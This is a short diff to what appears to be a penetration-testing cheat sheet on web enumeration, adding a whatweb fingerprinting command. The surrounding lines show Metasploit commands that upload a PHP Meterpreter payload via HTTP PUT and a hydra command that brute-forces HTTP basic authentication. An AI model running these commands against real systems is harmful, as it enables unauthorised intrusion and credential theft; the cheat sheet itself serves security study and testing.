@@ -267,7 +267,8 @@ Web enumeration means to look out info about services running on port, versions,
 		msf>auxiliary (http_put) > set filename meter.php
 		msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
 		msf>auxiliary (http_put) > exploit
-		
+## whatweb
+	whatweb http://192.168.1.160
 ## HTTP Basic Authentication Brute Force
 	# hydra -L /opt/user.txt -P /opt/password.txt 192.168.0.104 http-head "/test"
 
